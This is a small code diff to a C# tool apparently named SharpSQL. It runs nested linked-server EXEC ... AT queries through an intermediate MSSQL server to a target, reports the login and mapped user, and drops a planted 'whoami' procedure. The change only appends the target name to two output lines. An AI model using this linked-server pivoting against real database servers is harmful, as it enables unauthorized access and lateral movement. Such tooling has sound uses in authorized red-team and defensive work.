@@ -123,14 +123,14 @@ namespace SharpSQL.Commands
 			command = new SqlCommand(whoami, connection);
 			reader = command.ExecuteReader();
 			reader.Read();
-			Console.WriteLine("[+] Logged in as: " + reader[0]);
+			Console.WriteLine("[+] Logged in as: " + reader[0] + $" on {target}");
 			reader.Close();
 
 			string whoisuser = $"EXEC ('EXEC (''EXEC whoisuser'') AT [{target}]') AT {intermediate}";
 			command = new SqlCommand(whoisuser, connection);
 			reader = command.ExecuteReader();
 			reader.Read();
-			Console.WriteLine("[+] Mapped to user: " + reader[0]);
+			Console.WriteLine("[+] Mapped to user: " + reader[0] + $" on {target}");
 			reader.Close();
 
 			string dropProc = $"EXEC ('EXEC (''DROP PROCEDURE whoami'') AT [{target}]') AT {intermediate}";
